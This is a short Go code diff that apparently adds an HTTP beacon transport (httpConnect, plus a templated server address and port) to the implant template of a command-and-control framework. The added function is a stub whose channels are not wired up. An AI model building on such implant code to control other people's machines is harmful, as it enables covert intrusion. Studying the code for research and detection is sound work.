@@ -184,6 +184,38 @@ func getDefaultMTLSLPort() int {
 	return lport
 }
 
+// {{if .HTTPServer}}
+func httpConnect() (*Connection, error) {
+
+	address := getHTTPAddress()
+	client, err := httpStartSession(address)
+	if err != nil {
+		return nil, err
+	}
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		Ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		Cleanup: func() {
+
+		},
+	}
+
+	return connection, nil
+}
+
+// {{end}} -HTTPServer
+
+func getHTTPAddress() string {
+	return "{{HTTPServer}}:{{HTTPLPort}}"
+}
+
 // {{if .DNSParent}}
 func dnsConnect() (*Connection, error) {
 	// {{if .Debug}}
